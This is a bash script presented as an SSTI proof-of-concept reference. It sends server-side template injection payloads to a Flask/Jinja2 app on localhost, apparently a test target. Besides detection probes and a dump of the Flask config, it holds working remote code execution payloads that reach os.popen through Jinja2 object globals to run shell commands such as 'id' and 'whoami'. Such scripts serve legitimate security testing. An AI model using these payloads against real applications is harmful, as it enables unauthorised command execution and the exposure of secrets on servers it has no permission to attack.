#!/bin/bash
# SSTI POC Framework Reference - Comprehensive SSTI Testing for Flask/Jinja2

echo "============================================"
echo "SSTI Testing Reference - Flask/Jinja2"
echo "============================================"
echo ""

TARGET="http://localhost:5001"

echo "[*] Testing for Server-Side Template Injection vulnerabilities"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Math Operation Detection
echo "[TEST 1] Math Operation Detection (7*7 = 49)"
echo "Testing if template math is evaluated..."
curl -s "$TARGET/ssti/basic?message={{7*7}}" 2>&1 | grep -o "49" && echo "VULNERABLE: Math evaluation detected!" || echo "Not vulnerable to basic math SSTI"
echo ""

# Test 2: Basic Template Syntax
echo "[TEST 2] Template Variable Access"
echo "Attempting to access Flask config..."
curl -s "$TARGET/ssti/basic?message={{config}}" 2>&1 | head -3
echo ""

# Test 3: RCE via Dangerous Functions
echo "[TEST 3] RCE via Dangerous Template Functions"
echo "Attempting to access subprocess..."
curl -s "$TARGET/ssti/basic?message={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}" 2>&1 | head -3
echo ""

# Test 4: Alternative RCE via Jinja2
echo "[TEST 4] Alternative RCE via Jinja2 Attributes"
payload='{{ self.__init__.__globals__.os.popen("whoami").read() }}'
curl -s "$TARGET/ssti/basic?message=$payload" 2>&1 | head -3
echo ""

# Test 5: Framework-Specific Exploitation
echo "[TEST 5] Flask Config Access"
echo "Attempting to read Flask application config..."
curl -s "$TARGET/ssti/config?key=DEBUG" 2>&1 | head -5
echo ""

# Test 6: POST-based SSTI
echo "[TEST 6] POST-based SSTI"
echo "Testing SSTI via POST request..."
curl -s -X POST "$TARGET/ssti/post" \
  -d 'template={{7*7}}' \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1 | head -3
echo ""

# Test 7: Math Operation via Expression Parameter
echo "[TEST 7] Expression Parameter SSTI"
curl -s "$TARGET/ssti/math?expression=10+5" 2>&1 | grep -o "15" && echo "VULNERABLE: Expression evaluation detected!" || echo "Expression not evaluated"
echo ""

echo "[*] SSTI Testing Complete"
echo "[*] NOTE: These tests check for SSTI endpoints. If all return 404, SSTI endpoints are not deployed."
